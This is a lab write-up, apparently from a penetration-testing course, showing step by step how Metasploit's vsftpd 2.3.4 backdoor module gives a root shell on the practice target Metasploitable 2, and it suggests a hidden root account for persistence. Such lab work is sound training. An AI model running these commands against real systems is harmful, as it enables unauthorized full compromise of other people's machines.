```markdown
# üß™ Lab 13: Gaining Access with Metasploit

### Date: 2025-07-25
### Mentor: *The Da Vinci Cypher*
### Protocol Tier: Tier 1 ‚Äî The Sentinel's Forge
### Module: Module 1.6 ‚Äî Gaining Access & Exploitation

---

## üéØ 1. Objective
To use the Metasploit Framework to perform a full exploitation cycle against a deliberately vulnerable target (Metasploitable 2). The goal is to apply the phases of a penetration test: performing reconnaissance with `nmap`, selecting and configuring an appropriate exploit, launching the attack, and gaining a root-level command shell on the target.

## üß∞ 2. Tools Used
| Tool/Command | Purpose |
|--------------|---------|
| `nmap`       | Used for initial active reconnaissance to identify open ports and services. |
| `msfconsole` | The command-line interface for the Metasploit Framework. |
| Metasploit Framework | A professional exploitation toolkit containing a database of exploits and payloads. |

---

## üñ•Ô∏è 3. Process & Commands (Live Attack Chain)

### üîπ Step 1: Reconnaissance (from Kali VM)

* **Command:** `nmap -F [Metasploitable_IP]`
* **Key Finding:** Port 21/tcp was identified as `open` and running the `ftp` service. This was selected as the primary attack vector.

### üîπ Step 2: Exploitation (within `msfconsole`)

* **Start Metasploit:**
  ```bash
  msfconsole -q
  ```

* **Search for Exploit:**

  ```bash
  search vsftpd
  ```

* **Select Exploit:** An exploit targeting a known backdoor in vsftpd version 2.3.4 was chosen.

  ```bash
  use exploit/unix/ftp/vsftpd_234_backdoor
  ```

* **Configure Target:** The remote host (`RHOSTS`) was set to the Metasploitable 2 IP address.

  ```bash
  set RHOSTS [Metasploitable_IP]
  ```

* **Launch Attack:**

  ```bash
  exploit
  ```

### üîπ Step 3: Verifying Access

* Upon successful exploitation, Metasploit opened a command shell session.
* **Command to Verify Privilege Level:**

    ```bash
    whoami
    ```

* **Output:**

    ```plaintext
    root
    ```

---

## üîé 4. Observations & Analysis

* The attack was successful, progressing smoothly from reconnaissance to exploitation.
* The chosen exploit (`vsftpd_234_backdoor`) worked perfectly, indicating the target machine was running the specific, vulnerable version of the FTP server software.
* **Security Insight:** The payload delivered by the exploit resulted in a **root-level command shell**. This represents a total compromise of the target system. The attacker achieved the highest possible level of privilege, granting them complete control over the machine, including the ability to read/write/delete any file, install software, and create or delete users.
* **Next Attacker Phase:** The logical next step after gaining root access is to establish **persistence**. A common technique would be to create a new user account with root privileges, ensuring future access even if the original FTP vulnerability is discovered and patched.

---

## ‚úÖ 5. Conclusion

This lab demonstrated a complete and successful attack chain using the Metasploit Framework. It provided a practical, hands-on understanding of how the theoretical concepts of vulnerability, exploit, and payload come together in a real-world scenario. The exercise highlighted how effective reconnaissance (finding the open FTP port) leads directly to successful exploitation. The achievement of a root shell underscores the critical importance of keeping software patched and updated, as a single known vulnerability in an old service can lead to a complete system compromise.

```
